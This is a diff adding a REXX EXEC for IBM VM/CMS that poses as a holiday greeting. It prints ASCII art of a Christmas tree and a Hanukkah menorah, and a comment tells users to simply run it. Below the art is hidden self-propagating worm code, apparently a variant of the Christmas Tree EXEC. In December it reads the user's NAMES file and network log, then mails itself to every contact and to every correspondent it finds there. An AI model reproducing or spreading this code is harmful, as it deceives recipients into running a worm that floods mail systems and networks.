@@ -1,0 +1,101 @@
+/*********************/
+/*    LET THIS EXEC  */
+/*		     */
+/*	  RUN	     */
+/*		     */
+/*	  AND	     */
+/*		     */
+/*	 ENJOY	     */
+/*		     */
+/*     YOURSELF!     */
+/*********************/
+'VMFCLEAR'
+SAY '                *                ooooooooooooooooooooooooo'
+SAY '                *                o    Happy Hanukkah     o'
+SAY '               ***               o          ! !          o'
+SAY '              *****              o        ! | | !        o'
+SAY '             *******             o      ! | H H | !      o'
+SAY '            *********            o    ! | H H!H H | !    o'
+SAY '          *************          o    | H H H|H H H |    o'
+SAY '             *******             o    (_H_H_H|H_H_H_)    o'
+SAY '           ***********           o     (___________)     o'
+SAY '         ***************         o           H           o'
+SAY '       *******************       o           H           o'
+SAY '           ***********           o           H           o'
+SAY '         ***************         o        ___H___        o'
+SAY '       *******************       ooooooooooooooooooooooooo'
+SAY '     ***********************                           '
+SAY '         ***************        '
+SAY '       *******************         BEST WISHES'
+SAY '     ***********************    '
+SAY '   ***************************     FOR THE NEXT'
+SAY '             ******             '
+SAY '             ******                    YEAR'
+SAY '             ******               '
+/*     browsing this file is no fun at all
+       just type CHRISTMAS from cms */
+dropbuf
+makebuf
+"q t (stack"
+  pull d1 d2 d3 d4 d5 dat
+  pull zeile
+  jeah = substr(dat,7,2)
+  tack = substr(dat,4,2)
+  mohn = substr(dat,1,2)
+/*   say "jeah tack mohn"jeah tack mohn */
+if jeah <= 22 then do
+if mohn = 12 then do
+DROPBUF
+MAKEBUF
+"IDENTIFY ( FIFO"
+PULL WER VON WO IST REST
+DROPBUF
+MAKEBUF
+"EXECIO * DISKR " WER " NAMES A (FIFO"
+ DO WHILE QUEUED() > 0
+    PULL NICK NAME ORT
+    NAM = INDEX(NAME,'.')+1
+    IF NAM > 0 THEN DO
+       NAME = SUBSTR(NAME,NAM)
+    END
+    NAM = INDEX(ORT,'.')+1
+    IF NAM > 0 THEN DO
+       ORT  = SUBSTR(ORT,NAM)
+    END
+    IF LENGTH(NAME)>0 THEN DO
+       IF LENGTH(ORT) = 0 THEN DO
+  ORT = WO
+       END
+       if name ^= "RELAY" then do
+       "SF xmas EXEC A " NAME " AT " ORT " (ack"
+       end
+    END
+ END
+DROPBUF
+MAKEBUF
+ANZ = 1
+"EXECIO * DISKR " WER " NETLOG A (FIFO"
+ DO WHILE QUEUED() > 0
+    PULL KIND FN FT FM ACT FROM ID AT NODE REST
+    IF ACT = 'SENT'  THEN DO
+       IF ANZ = 1 THEN DO
+         OK.ANZ = ID
+       END
+       IF ANZ > 1 THEN DO
+          OK.ANZ = ID
+          NIXIS = 0
+          DO I = 1 TO ANZ-1
+          IF OK.I = ID THEN DO
+            NIXIS = 1
+          END
+       END
+      END
+      ANZ = ANZ + 1
+       IF NIXIS = 0 THEN DO
+       "SF xmas EXEC A " ID " AT " NODE " (ack"
+       END
+    END
+ END
+DROPBUF
+END
+end
